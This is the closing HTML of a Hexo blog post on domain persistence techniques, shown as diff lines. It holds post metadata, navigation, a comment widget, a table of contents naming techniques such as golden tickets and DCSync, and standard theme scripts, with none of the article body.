+        <li><strong>Author:</strong> yuBetter</li>
+        <li><strong>Created at:</strong> 2024-02-29 21:29:30</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2024-02-29 21:30:39
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://yubetter.github.io/2024/02/29/权限维持-域环境/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2024/02/29/%E5%9F%9F%E6%B8%97%E9%80%8F/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">域渗透</span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2024/02/29/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-Windows/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">权限维持---Windows</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+                <div class="comment-container">
+                    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+ 
+    <div id="waline"></div>
+    <script type="module"  data-pjax>
+        import { init } from 'https://evan.beee.top/js/waline.mjs';
+
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://example.example.com',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+            });
+        }
+
+        if ('true') {
+            const loadWalineTimeout = setTimeout(() => {
+                loadWaline();
+                clearTimeout(loadWalineTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadWaline);
+        }
+        
+    </script>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">权限维持---域环境</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-text">域控权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos"><span class="nav-text">Kerberos</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberos%E5%8D%8F%E8%AE%AE%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="nav-text">Kerberos协议认证流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-text">黄金票据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-text">白银票据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1"><span class="nav-text">常见服务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%87%E8%83%BD%E7%A5%A8%E6%8D%AE"><span class="nav-text">万能票据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DSRM"><span class="nav-text">DSRM</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90"><span class="nav-text">利用前提</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E6%BC%94%E7%A4%BA"><span class="nav-text">操作演示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E5%85%A8%E6%94%AF%E6%8C%81%E6%8F%90%E4%BE%9B%E7%A8%8B%E5%BA%8FSSP"><span class="nav-text">自定义安全支持提供程序SSP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8ACL-AdminSDHolder"><span class="nav-text">访问控制列表ACL-AdminSDHolder</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SID-History"><span class="nav-text">SID-History</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8AdminSDHolder%E6%89%93%E9%80%A0%E5%9F%9F%E5%90%8E%E9%97%A8"><span class="nav-text">利用AdminSDHolder打造域后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HOOK-PasswordChangeNotify"><span class="nav-text">HOOK PasswordChangeNotify</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DCSync%E6%8A%80%E6%9C%AF"><span class="nav-text">DCSync技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8DCSync%E5%AF%BC%E5%87%BA%E5%9F%9F%E5%86%85hash"><span class="nav-text">利用DCSync导出域内hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8DCSync%E7%BB%B4%E6%8C%81%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90"><span class="nav-text">利用DCSync维持域内权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DCShadow"><span class="nav-text">DCShadow</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">yuBetter</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.1.1</a>
+        </div>
+        
+        
+        
+            <div id="start_div" style="display:none">
+                2022/8/17 11:45:14
+            </div>
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+
+<script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/utils.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/main.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/navbarShrink.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/scrollTopBottom.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/lightDarkSwitch.js"></script>
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/localSearch.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/codeBlock.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/lazyload.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/runtime.js"></script>
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/odometer.min.js"></script>
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/assets/odometer-theme-minimal.css">
+
+
+
+  <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/Typed.min.js"></script>
+  <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/plugins/typed.js"></script>
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/tocToggle.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/anime.min.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/toc.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/plugins/tabs.js"></script>
+    
+</div>
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
